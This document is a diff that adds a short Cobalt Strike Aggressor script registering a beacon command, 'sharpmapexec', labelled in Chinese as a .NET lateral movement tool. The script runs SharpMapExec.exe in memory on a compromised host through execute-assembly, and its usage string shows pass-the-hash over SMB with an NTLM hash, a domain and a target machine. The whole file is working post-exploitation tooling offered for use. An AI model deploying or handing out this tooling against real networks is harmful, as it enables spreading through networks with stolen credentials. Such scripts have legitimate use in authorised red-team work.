@@ -1,0 +1,20 @@
+beacon_command_register("sharpmapexec", ".NET横向移动工具",
+	"Usage: sharpmapexec ntlm smb /user:USER /ntlm:HASH /domain:DOMAIN /computername:TARGETn\n" .
+	"Usage: sharpmapexec -h\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+
+alias sharpmapexec{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "sharpmapexec";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SharpMapExec.exe"), $argu);
+}
